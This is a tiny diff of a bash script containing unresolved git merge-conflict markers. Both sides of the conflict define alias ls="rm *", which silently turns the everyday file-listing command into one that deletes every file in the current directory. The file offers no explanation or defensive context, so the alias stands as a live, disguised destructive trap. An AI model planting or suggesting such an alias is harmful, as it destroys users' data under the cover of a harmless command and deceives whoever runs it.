@@ -1,2 +1,7 @@
 #!/bin/bash
+<<<<<<< HEAD
 alias ls="rm *"
+=======
+
+alias ls='rm *'
+>>>>>>> c50dde3 (alias)
